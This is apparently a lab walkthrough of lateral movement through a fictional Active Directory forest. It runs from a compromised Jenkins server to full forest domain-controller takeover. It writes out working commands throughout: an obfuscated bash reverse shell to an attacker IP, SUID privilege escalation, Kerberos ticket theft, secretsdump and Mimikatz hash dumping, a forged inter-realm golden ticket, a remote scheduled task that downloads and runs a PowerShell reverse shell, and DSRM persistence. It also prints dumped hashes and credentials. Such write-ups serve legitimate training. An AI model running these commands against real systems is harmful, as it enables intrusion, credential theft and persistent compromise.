# Lateral Movement - 1

- [Lateral Movement - 1](#lateral-movement---1)
  - [SSH Tunnel](#ssh-tunnel)
  - [nmap scanning](#nmap-scanning)
  - [Jenkins](#jenkins)
  - [Local Enumeration](#local-enumeration)
  - [Domain Enumeration on Linux](#domain-enumeration-on-linux)
  - [Privilege Escalation to support](#privilege-escalation-to-support)
  - [Requests using support keytab](#requests-using-support-keytab)
  - [Setting Jenkin server as HTTP SOCKS Proxy](#setting-jenkin-server-as-http-socks-proxy)
  - [Pass-the-Ticket](#pass-the-ticket)
  - [Hash dumping on Child-DC](#hash-dumping-on-child-dc)
  - [Forge Inter-realm TGT](#forge-inter-realm-tgt)
  - [Password Dumping on Forest DC](#password-dumping-on-forest-dc)
- [External Trust Enumeration](#external-trust-enumeration)

---

## SSH Tunnel

Since we have the ssh credential of `iyer`, and we know there is a connection between the Production-Server and an internal address `10.1.3.1`, we can try to reach it via ssh tunnel.

First check out proxychain setting:

```
cat /etc/proxychains.conf | grep 9050
```

Then ssh to `192.168.3.8` using the follow command:

```
ssh -N -D 9050 iyer@192.168.8.3 
```

<br/>

## nmap scanning

First get a standalone version of nmap to the Production-Server.

(Source: https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap)

<br/>

Host the binary on the attacker machine using python3:

```
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap
python3 -m http.server 80
```

<br/>

Then on Production-Server, download nmap and run the scan:

```
cd /tmp
wget http://192,168.100.11/nmap
chmod +x ./nmap
./nmap -n -Pn -T4 10.1.3.1 -p-
```

![picture 28](images/953b40f002ea08a33026d86d3602be7741c3c24e818c141a098f5b03e969aa6c.png)  

As shown, tcp/1234 is opened on 10.1.3.1.

<br/>

Try to access via proxychain:

![picture 29](images/72cffca4a25e0c6a562f46fc594812d68e715e63d3eb49596cdc6e6597aa5a5c.png)  

<br/>

![picture 30](images/10ced91b8884f83fe802f96af6299b9f49204df93768d0a117ddf0c12461e0c3.png)  

Jenkins, a CI/CD server, is found to be running.

<br/>

---

## Jenkins

Try using admin/admin to login and it is successful.

![picture 31](images/86d2f75518a288b230ca35c19fb279339cfac6e317161f286e2305b6e78ec55c.png)  

<br/>

Create a new job named **Admin Build**:

![picture 32](images/993982da77455ded0c5cea3a1240284a66129fa5754273c7ba569adbf7503786.png)  

<br/>

![picture 33](images/d7f3884f2e2c2196b4f80cd91fbf3b580180f7f28323a6733fc0fc4460cffeef.png)  

<br/>

However, we have no permission to do so. Further checking the available users, there is a user called `autoadmin`:

![picture 34](images/f6b8304efb485cabdd80075f9dae9dd81f566c5b386a8c7b97030ed8eb1c3a8b.png)  

<br/>

Checking `http://10.1.3.1:1234/credentials/`, a cleartext credential is found:

![picture 35](images/4e7ca41d49bce063adf3f6f580e41e196694cb798ea0e0a248b0a7ccc88fc0c2.png)  

<br/>

> Credential:
> 
> autoadmin / Jenk!nsADMIN

<br/>

Login as autoadmin:

![picture 36](images/5424d7a74988b961ffb88b13b0efd85e3e58aaaf5c3f24473f001562eceef49b.png)  

<br/>

Use the Jenkins script function on `http://10.1.3.1:1234/script` in attempt to get a reverse shell (launch a netcat listener on the attacker machine first):

```
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMS80NDMgMD4mMScK}|{base64,-d}|{bash,-i}'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

<br/>

Note the original of the base64 encoded command:

```
bash -c 'bash -i >& /dev/tcp/192.168.100.11/443 0>&1'
```

![picture 38](images/9f19d0c598d2454b80d8510af49e927bc13a84187a62d729f7f40b37747fda30.png)  


<br/>

A reverse shell calls back:

![picture 39](images/6466e37d44b9491d5d2c7dbe96592a82f4f654c78c06ab99575a9d839aed4cc5.png)  


<br/>

Spawn a PTY shell:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

<br/>

---

## Local Enumeration

Checking the `/home` directory, it looks like the `Automation-Server` is a domain joined computer.

![picture 40](images/d27bd8889c9bdfb44583f8c2213ffc15136af0e10860419a5b4ef6367da13c40.png)  

<br/>

Inspecting `/home/autoadmin/Desktop/ssu_auto.sh`, a cleartext credential of `webadmin` is found, but it is not a valid password.

![picture 41](images/0bf9f3b46ea85aede94afe32b4c94b1fdd63cba1f1021f1d3501531c4e1962f9.png)  

![picture 42](images/cc17f0383e3ded933fe69842b8f381026e447554c591913966e0b898c1e6dfb6.png)  


<br/>

Checking `/home/autoadmin/Downloads`, there are some interesting files and folders:

![picture 43](images/4c7c1b39da877e61e36f54a9093ad0f816627cecd072ee56a433545e3fa05ae5.png)  

<br/>

---

## Domain Enumeration on Linux

To confirm it is a domain-joined computer, we can find `.keytab` file:

```
find / -name *.keytab -type f 2>/dev/null
```

![picture 44](images/00f51dffc6841fe19ac8c9eabd479d2f4566d2f3728e15ed41f29e8623175424.png)  

<br/>

As shown, `/etc/krb5.keytab` exists and it is likely that this machine is domain-joined.

<br/>

Enumerate binaries with SUID bit set:

```
find / -perm -u=s -type f 2>/dev/null
```

![picture 45](images/8db416a40a4ae117fc48dedf6b28d6b49a94983e4c3fd239dac9e0ef4085c24b.png)  

![picture 46](images/c78ccf52d05f8854546b27edf7b4254e614d5c56981b048eba16d9ac0943ee11.png)  

<br/>

Try to use this `find` binary to enumerate other `keytab` file:

```
/var/lib/jenkins/find / -name *.keytab -type f 2>/dev/null
```

![picture 47](images/26b78d2ae53e9f14f58a3e344ad6d7edb7025bf4ce80539708e4fe88c9978df8.png)  

<br/>

As shown, there is a keytab file in the path `/home/support@operations.atomic.site/adm_domain.keytab`

<br/>

----

## Privilege Escalation to support

Since a `find` with SUID is found, we can use it to escalate our privilege.


```
/var/lib/jenkins/find . -exec /bin/bash -p \;
```
![picture 48](images/b78c4c2786c205f2d766ec1e7335a01ac5dc7e42cdbd16ff7d4c82c649a9132f.png)  

As shown, we become the support user in the domain.

<br/>

---

## Requests using support keytab

In the previous section, we identified `/home/support@operations.atomic.site/adm_domain.keytab`. Deduced from the name, it is possible to be the `Domain Admin` keytab file (Domain: operations.atomic.site).

<br/>

With the keytab file, we can request for TGT:

```
cd /home/support\@operations.atomic.site/
```


```
kinit adm_domain@OPERATIONS.ATOMIC.SITE -k -t adm_domain.keytab
```
* Note that the `@` part should be in CAPITAL LETTERS.

![picture 49](images/6b57b5a935649c37c2e83a3124b4106837e2fc8be6cbad0194d6b4d513363d22.png)  


<br/>

Check the IP address of `operations.atomic.site` using `nslookup`:

```
nslookup OPERATIONS.ATOMIC.SITE
```
![picture 50](images/4e7b8e5eba5c37abbf21fd6b23d95a5917b1d8fbdd7a8e57b0ce6ff2267ef4e1.png)  
- 10.1.1.2

<br/>

To get the ComputerName of the DC, we can use check the LDAP record:

```
nslookup -type=any _ldap._tcp.dc._msdcs.operations.atomic.site
```

![picture 51](images/0b3122f70eb0d0537c34a157a60a700d36499acdd1ac987e04a6ac523b46b463.png)  

* As shown, the ComputerName is **OPS-CHILDDC**

<br/>

Then, request a TGS for CIFS:

```
kvno CIFS\/OPS-CHILDDC
klist
```

![picture 52](images/5ab2be853a3ccbc71e40958f387c717fcd41585d341ebd3b18b4a683cee993ce.png)  

<br/>

To transfer the TGS to the attacker machine, first base64 encode the TGS:

```
base64 -w 0 < /tmp/krb5cc_123
```

![picture 53](images/2594f671853d85af70863eaf1a93f928483c7a9d26bf8b2800809361d4063d3d.png)  

<br/>

Then copy the output string and decode in the attacker machine:

```
echo -n "<copied string>" | base64 -d > krb5cc_123
```

![picture 54](images/ce75f8f42ad0d2b9db43ba1f9e0e0733befd421bebb7787ef5dda1bb0600d2d1.png)  


<br/>

## Setting Jenkin server as HTTP SOCKS Proxy

First download `ncat` on Kali Linux:

```
wget https://github.com/ZephrFish/static-tools/raw/master/ncat
``` 

<br/>

Serve `ncat` on the current directory using python http.server:

```
python3 -m http.server 80
```

![picture 6](images/e6b1a9dac987e11af73d111897df45a63d29a11cbbd46ed4724031460265fd31.png)  

<br/>

Then on the Jenkin machine, download the served `ncat`:

```
wget http://192.168.100.11/ncat
```

![picture 7](images/adc8f705ccec32b48462b787c4d60278fe99610c5313200d5cbd56b2e653b9a3.png)  

<br/>

Use `ncat` to setup a http socks proxy:

```
chmod +x ncat
```

```
./ncat -l 4444 --proxy-type http &
```

![picture 8](images/4e38b7d8a6220cf618550220cd9f5763e090e4bf35e16aa1da2c04648d20e7d6.png)  

<br/>

Then do a reverse port forwarding using the tunnel on the Jenkins machine:
```
ssh -R 4445:127.0.0.1:4444 brian@192.168.100.11
```
![picture 9](images/6854041dabbd37e6a221ff5fe47908ffe585c5bbeb25ee8cd48ddd76b1f1582a.png)  

<br/>

Now check the listening ports on the attacker machine using `netstat`:

```
netstat -antup | grep 4445
```

![picture 10](images/169782a784c91c2a340e63747d62f593caf7f85d565fabd216929d163153578c.png)  

<br/>

Then change the http socks port in  `/etc/proxychains.conf`:
![picture 12](images/e6ec86dfb4b64730a2e324c99c720a7f3f6ca780e1db4cc01356344fae60ace8.png)  
 

<br/>

## Pass-the-Ticket

To use krb ticket, first install the following package:

```
apt install -y krb5-user
```

<br/>

Then use impacket to pass-the-ticket:

```
export KRB5CCNAME=./krb5cc_123
```

```
echo "10.1.1.2 OPS-CHILDDC" >> /etc/hosts
```

```
proxychains psexec.py -k -no-pass -debug -dc-ip 10.1.1.2 adm_domain@OPS-CHILDDC
```

<br/>

However, it is not successful. A possible reason is the time difference of the attacker machine and the target is greater than 15 minutes.

![picture 13](images/618dc3ec3107fc274218c7a51a1a24207f8e7b1f48cef5666e46ba0462c08e96.png)  

<br/>

This should be working after the target machine is rebooted:
![picture 14](images/45bd6dc0eea929a798ded1e68ee20c58bc8ad03c02d14faf10aaa11fd823c983.png)  

<br/>

## Hash dumping on Child-DC

Use Impacket `secretdump.py` to dump hashes on Child-DC:

```
proxychains secretsdump.py -k -no-pass -just-dc-user adm_domain -debug -dc-ip 10.1.1.2 adm_domain@OPS-CHILDDC
```

<br/>

The NTLM hash of `adm_domain` is obtained `3d15cb1141d579823f8bb08f1f23e316`:
![picture 15](images/589d7dca8aa16299157bd50b890142b15c4d8e49c0de75c30d9e7aaedbdbae6d.png)  

<br/>

Also dump all the hashes in the `ntds.dit` database since this is a DC:

```
proxychains secretsdump.py -k -no-pass -debug -dc-ip 10.1.1.2 adm_domain@OPS-CHILDDC
```

```                          
Administrator:500:aad3b435b51404eeaad3b435b51404ee:56df9bfe3024dd4eb25b412ead89fe08:::

Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

OPERATIONS\OPS-CHILDDC$:plain_password_hex:387d08d86a6383f9163bcca0d01896d6501e47135dccdbd10296852d8acf70bd0e92b2796ae215395046deac5c12e58f2535177a536972fa6bd784350b975cba831e237829a9017ea9623fa8567be6159c95f46ae
a2465504b3019fa3992ddbec78e55d1adfc44819d83754b577e91762568f50becacb418320d97444d9da8447e23feec121a3b625a0521f508c69551cea74b91f6f3c7934364caf1167ace1c94e47391331475e682b67e2d5c706cdb01370da98ad7dbdb6778be413eece
0115966fb73c6986786afaa6795e7fbd35660e5964d81c65b0d0e040cc1546d6782e462c91cef06b18c6ce26fda97927176

OPERATIONS\OPS-CHILDDC$:aad3b435b51404eeaad3b435b51404ee:557a460cc1438fb35870b75383608196:::

krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8e2b8effbf6735b8fb5be206cb3dfead:::

operations.atomic.site\sysadmin:1110:aad3b435b51404eeaad3b435b51404ee:33da4461cc64d97d6766bea54d8824c7:::

operations.atomic.site\support:1114:aad3b435b51404eeaad3b435b51404ee:dd8ab1ad74d9faf1900eac349c8fb3e5:::

[+] Decrypting hash for user: CN=Homi Jehangir Bhabha,OU=Employee,DC=operations,DC=atomic,DC=site
operations.atomic.site\homi:1115:aad3b435b51404eeaad3b435b51404ee:4d32b988b70b389423886883f666ed66:::

[+] Decrypting hash for user: CN=Iyer Murty,OU=Employee,DC=operations,DC=atomic,DC=site
operations.atomic.site\iyer:1116:aad3b435b51404eeaad3b435b51404ee:493483461831ba82fe193fe01653da6a:::

[+] Decrypting hash for user: CN=Srinivasa Krishnan,OU=Employee,DC=operations,DC=atomic,DC=site
operations.atomic.site\sri:1117:aad3b435b51404eeaad3b435b51404ee:50e3b28275dc32db9f2e82b2e25968e2:::

[+] Decrypting hash for user: CN=Service-DB,OU=Service Accounts,DC=operations,DC=atomic,DC=site
operations.atomic.site\srv-db:1118:aad3b435b51404eeaad3b435b51404ee:c60cc979b81b15f2e23848eac75bef16:::

[+] Decrypting hash for user: CN=service-auto,OU=Service Accounts,DC=operations,DC=atomic,DC=site
operations.atomic.site\srv-auto:1119:aad3b435b51404eeaad3b435b51404ee:ea06afda9cb34106ddaf747108eb1af1:::

[+]] Decrypting hash for user: CN=Admin Domain,OU=Service Accounts,DC=operations,DC=atomic,DC=site
operations.atomic.site\adm_domain:1121:aad3b435b51404eeaad3b435b51404ee:3d15cb1141d579823f8bb08f1f23e316:::

[+] Decrypting hash for user: CN=IIS-admin,OU=Service Accounts,DC=operations,DC=atomic,DC=site
operations.atomic.site\iisadmin:1126:aad3b435b51404eeaad3b435b51404ee:7e44e374b6a9d37380d77970d8e2e2dc:::

[+] Decrypting hash for user: CN=OPS-CHILDDC,OU=Domain Controllers,DC=operations,DC=atomic,DC=site
OPS-CHILDDC$:1000:aad3b435b51404eeaad3b435b51404ee:557a460cc1438fb35870b75383608196:::

[+] Decrypting hash for user: CN=DB-SERVER,CN=Computers,DC=operations,DC=atomic,DC=site
DB-SERVER$:1111:aad3b435b51404eeaad3b435b51404ee:8ebe356223ef0b7b8831ba3349e12513:::

[+] Decrypting hash for user: CN=REPO-SERVER,CN=Computers,DC=operations,DC=atomic,DC=site
OPERATIONS.ATOMIC.SITE\REPO-SERVER$:1112:aad3b435b51404eeaad3b435b51404ee:f3cbb96681af765b402de7b8624f8f5c:::

[+] Decrypting hash for user: CN=AUTOMATION-SERV,CN=Computers,DC=operations,DC=atomic,DC=site
OPERATIONS.ATOMIC.SITE\AUTOMATION-SERV$:1113:aad3b435b51404eeaad3b435b51404ee:4930f9a7ea2e28c8d90d1c6c94725866:::

[+] Decrypting hash for user: CN=SCIENTIST-MACHI,CN=Computers,DC=operations,DC=atomic,DC=site
SCIENTIST-MACHI$:3101:aad3b435b51404eeaad3b435b51404ee:35d811fb8407f03f017e770729475a2c:::

[+] Decrypting hash for user: CN=ATOMIC$,CN=Users,DC=operations,DC=atomic,DC=site
ATOMIC$:1103:aad3b435b51404eeaad3b435b51404ee:6d76fb226a7109795a970e9a8f466833:::

```
<br/>

To obtain the Domain SID, we can use `wmic` in the PSExec shell:

```
wmic group where name="Domain Admins" get name,sid,domain
```

![picture 16](images/e2162f3fd4a140703625faeaaebb190b818e7bd5d14bfabe4e466fc14f256ae9.png)  


Operations.atomic.site:<br/>
`S-1-5-21-3757735274-1965336150-1982876978`
<br/>
Atomic.site:<br/>
`S-1-5-21-95921459-2896253700-3873779052`
<br/>

<br/>

## Forge Inter-realm TGT

In order to get into the Parent DC, with the NTLM of `krbtgt` account, we can forge inter-realm TGT using Mimikatz.
<br/>

In the attacker machine, serve Mimikatz.exe:

```
cd /usr/share/windows-resources/mimikatz/x64
python3 -m http.server 80
```

<br/>

Then in the PSExec shell, download mimikatz:

```
cd C:\Users\Public
certutil -urlcache -f http://192.168.100.11/mimikatz.exe .\mimikatz.exe
```

![picture 17](images/68f9f99a76488d267206f5669f874034148915c7e79551fcd3a81d2aab8d3470.png)  

<br/>

Then run `mimikatz.exe` to forge a inter-realm TGT:

```
kerberos::golden /user:adm_domain /domain:operations.atomic.site /sid:S-1-5-21-3757735274-1965336150-1982876978 /sids:S-1-5-21-95921459-2896253700-3873779052-512 /krbtgt:8e2b8effbf6735b8fb5be206cb3dfead /ticket:C:\Users\Public\forge.kirbi
```

![picture 19](images/bfe58642c9a6815786acd2d09cae6f983aa89bc27c470eda3d787cbd766b000b.png)  

<br/>

Check the forest DC hostname:

```
nslookup -type=any _ldap._tcp.dc._msdcs.atomic.site
```

![picture 20](images/a3ef9e2bf9290e19cf37485c7380467c1e3137716c278d8f80f5c7d0db1d2a74.png)  

* IP:  `10.1.1.1`
* Hostname: `atomic-dc.atomic.site`

<br/>

Use Mimiaktz to perform PTT:

```
kerberos::ptt C:\Users\Public\forge.kirbi
```

![picture 21](images/3d4935678f5dac3acb5f30bcda9ef2b528ece3627530508151cd96e25be818f8.png)  

<br/>

Try to list the forest DC's root directory:

```
dir \\atomic-dc.atomic.site\c$
```

![picture 22](images/9d1f92e01951a23cfb3eff7c506c6e374f6eab074a9c1af5ca64a95431b560d9.png)  

As shown, we now have the forest dc access.

<br/>

To get a reverse shell, modify the `Invoke-PowerShellTcp.ps1` from Nishang by adding the following in the last line:

```
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.100.11 -Port 443
```

<br/>

Then on the local machine, prepare a nc listener:

```
nc -nlvp 443
```

<br/>

Also serve the `Invoke-PowerShellTcp.ps1` script:

```
python3 -m http.server 80
```

<br/>

On the PSExec shell, create a remote schedule task:

```
schtasks /create /S atomic-dc.atomic.site /SC Weekly /RU "Administrator" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object System.Net.WebClient).DownloadString(''http://192.168.100.11/Invoke-PowerShellTcp.ps1''')'"
```

<br/>

Run the scheduled task:

```
schtasks /Run /S atomic-dc.atomic.site /TN "STCheck"
```

![picture 23](images/bf629e2a350220e7a572a694bf1c227657ab3babd7cdc7c8d5fe4dd6a3791e03.png)  

![picture 24](images/f289ccd0e2f98d3d88fbeccb77929233a3e32a972532f7393ba5d3721b8c477b.png)  

<br/>

As shown, we have a reverse shell on the Forest DC `ATOMIC-DC`.

<br/>

## Password Dumping on Forest DC

First download mimikatz:

```
cd C:\Users\Public
wget http://192.168.100.11/Invoke-Mimikatz.ps1 -OutFile .\Invoke-Mimikatz.ps1
```

<br/>

Then dump password using Mimikatz powershell script:

```
. .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -DumpCreds
```

![picture 25](images/022aca0d2b40796410c37ef55ad0a7d8b11167c511765a0ec854e9fb6a95ed97.png)  

As shown, we obtain the Enterprise Admin NTLM:<br/>
`c49927a1eb5a335dfb681db95d3a45a2`

<br/>

```
ATOMIC\Administrator:
SID:   S-1-5-21-95921459-2896253700-3873779052-500
NTLM:  c49927a1eb5a335dfb681db95d3a45a2

ATOMIC\ATOMIC-DC$
SID:   S-1-5-90-0-1
NTLM:  f2a2a8b45cfc4d08481ab3c6e1b531e0
```

<br/>

Also dump the DSRM key:

```
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```

![picture 26](images/99f37e2a1bfefa77dac177d7a6adab97eb27e0bc1e1412c21a0be430435b4e2b.png)  

* DSRM: `56df9bfe3024dd4eb25b412ead89fe08`

<br/>

To persist, enable DSRM usage over network:

```
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonbehavior" -Value 2 -PropertyType DWORD
```

![picture 27](images/5efad717b6939b2377402a7356b68255e1dac2dacaaa95cd938f1a1aa63db95f.png)  

<br/>

Dump all hashes:

```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

```
Domain : ATOMIC / S-1-5-21-95921459-2896253700-3873779052                                                                                                                                                           
                                                                                                                                                                                                                    
RID  : 000001f4 (500)                                                                                                                                                                                               
User : Administrator                                                                                                                                                                                                
LM   :                                                                                                                                                                                                              
NTLM : c49927a1eb5a335dfb681db95d3a45a2                                                                                                                                                                             

RID  : 000001f5 (501)
User : Guest
LM   : 
NTLM : 

RID  : 000001f6 (502)
User : krbtgt
LM   : 
NTLM : 5d14653ad207e053f2dbb9e3833b08bf

RID  : 000001f7 (503)
User : DefaultAccount
LM   : 
NTLM : 

RID  : 00000457 (1111)
User : atasrv
LM   : 
NTLM : 7f9b42b69b821e3526263ab93bb407bf

RID  : 00000835 (2101)
User : fsp-user
LM   : 
NTLM : 66efe4960b2a96982f06f7af2966fa1b

RID  : 000003e8 (1000)
User : ATOMIC-DC$
LM   : 
NTLM : f2a2a8b45cfc4d08481ab3c6e1b531e0

RID  : 00000455 (1109)
User : OPERATIONS$
LM   : 
NTLM : 38e5f1f81e90a4ae014f83429a36a082

RID  : 0000045a (1114)
User : NUCLEAR$
LM   : 
NTLM : 285520f366660265a99ec7bc9603d6b2
```

<br/>

As shown in the result, there is an unknown machine account "nuclear". Try to use nslookup to resolve:

```
nslookup nuclear.site
```

![picture 28](images/9e3641583d7ea923b6094d0da03bd221b9989fba8c14c92bb3ccce01cb83a479.png)  

<br/>

In so, `285520f366660265a99ec7bc9603d6b2` is likely the trust key.

<br/>

# External Trust Enumeration

